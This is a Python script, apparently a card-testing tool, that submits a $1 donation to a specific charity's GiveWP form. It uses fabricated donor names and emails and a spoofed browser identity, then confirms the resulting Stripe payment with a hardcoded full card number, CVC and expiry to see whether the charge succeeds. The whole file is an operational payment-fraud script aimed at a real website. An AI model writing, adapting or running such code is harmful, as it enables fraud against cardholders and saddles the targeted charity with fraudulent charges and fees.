import requests
import re
import random
from faker import Faker
from user_agent import generate_user_agent

x = Faker()
n = x.name()
r = requests.Session()
u = generate_user_agent()

def python():
    first = ["ahmed", "mohamed", "ali", "omar", "youssef", "khaled", "abdullah", "fatma", "sara", "nour", "lina", "maya", "hala", "reem", "salma", "amr", "tarek", "hassan", "ibrahim", "karim"]
    last = ["hassan", "ahmed", "mohamed", "ali", "ibrahim", "khalil", "said", "ramadan", "elmasry", "abdallah", "fathy", "tarek", "mostafa", "adel", "gamal"]
    dom = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com", "icloud.com", "protonmail.com", "live.com", "msn.com", "aol.com", "mail.com"]
    
    f = random.choice(first)
    l = random.choice(last)
    n = random.randint(10, 9999)
    
    patterns = [
        f"{f}.{l}{n}",
        f"{f}{l}{n}",
        f"{f}_{l}{n}",
        f"{f}{n}",
        f"{l}.{f}{n}",
        f"{f}{l}.{n}",
        f"{f}.{l}.{n}",
        f"{f}{random.randint(1980, 2005)}"
    ]
    
    return f"{random.choice(patterns)}@{random.choice(dom)}".lower()
    
e = python()

headers = {
    'authority': 'dabbaghwelfare.org',
    'accept': 'application/json',
    'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
    'origin': 'https://dabbaghwelfare.org',
    'referer': 'https://dabbaghwelfare.org/?givewp-route=donation-form-view&form-id=2784&locale=en_US',
    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': u,
}

params = {
    'givewp-route': 'donate',
    'givewp-route-signature': '91a10e8029bcdbe0c6ccb1e7a9ad3d77',
    'givewp-route-signature-id': 'givewp-donate',
    'givewp-route-signature-expiration': '1780151834',
}

files = {
    'amount': (None, '1'),
    'currency': (None, 'USD'),
    'donationType': (None, 'single'),
    'subscriptionPeriod': (None, 'one-time'),
    'subscriptionFrequency': (None, '1'),
    'subscriptionInstallments': (None, '0'),
    'formId': (None, '2784'),
    'p2pSourceID': (None, '0'),
    'type_of_your_donation': (None, 'Lillah'),
    'gatewayId': (None, 'stripe_payment_element'),
    'feeRecovery': (None, '0'),
    'p2pSourceType': (None, ''),
    'firstName': (None, n),
    'lastName': (None, n),
    'email': (None, e),
    'mobile': (None, '3150383794'),
    'text_field': (None, ''),
    'note__comment_for_admin': (None, ''),
    'email_1': (None, 'false'),
    'telephone': (None, 'false'),
    'sms': (None, 'false'),
    'giftAid[firstName]': (None, ''),
    'giftAid[lastName]': (None, ''),
    'giftAid[address]': (None, ''),
    'giftAid[postcode]': (None, ''),
    'giftAid[country]': (None, 'GB'),
    'giftAid[optIn]': (None, 'false'),
    'donationBirthday': (None, ''),
    'originUrl': (None, 'https://dabbaghwelfare.org/donations/support-dabbagh-welfare-trust-projects/'),
    'isEmbed': (None, 'true'),
    'embedId': (None, '2784'),
    'locale': (None, 'en_US'),
    'gatewayData[stripePaymentMethod]': (None, 'card'),
    'gatewayData[stripePaymentMethodIsCreditCard]': (None, 'true'),
    'gatewayData[formId]': (None, '2784'),
    'gatewayData[stripeKey]': (None, 'pk_live_51HwlvhD4h6LDgGZGqswBiVPPav5M1NN6SaTeRAqxd9cHbRU4lAXzrpuamYrWo2W88hD7jfBh0ZosFAfn6Uhxuieu00Ium1Nss9'),
    'gatewayData[stripeConnectedAccountId]': (None, 'acct_1HwlvhD4h6LDgGZG'),
}

response = r.post('https://dabbaghwelfare.org/', params=params, cookies=r.cookies, headers=headers, files=files)

xp = response.json()['data']['clientSecret']
xxp = xp
xxxp = xp.split('_secret')[0]

headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': u,
}

data = f'payment_method_data[billing_details][name]={n}+{n}&payment_method_data[billing_details][email]={e}&payment_method_data[billing_details][address][country]=FR&payment_method_data[type]=card&payment_method_data[card][number]=4382+8984+9812+4004&payment_method_data[card][cvc]=139&payment_method_data[card][exp_year]=29&payment_method_data[card][exp_month]=11&payment_method_data[payment_user_agent]=stripe.js%2Faf71287371%3B+stripe-js-v3%2Faf71287371%3B+payment-element%3B+deferred-intent%3B+autopm&key=pk_live_51HwlvhD4h6LDgGZGqswBiVPPav5M1NN6SaTeRAqxd9cHbRU4lAXzrpuamYrWo2W88hD7jfBh0ZosFAfn6Uhxuieu00Ium1Nss9&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&client_secret={xxp}'

response = r.post(
    f'https://api.stripe.com/v1/payment_intents/{xxxp}/confirm',
    headers=headers,
    data=data,
)

print(response.text)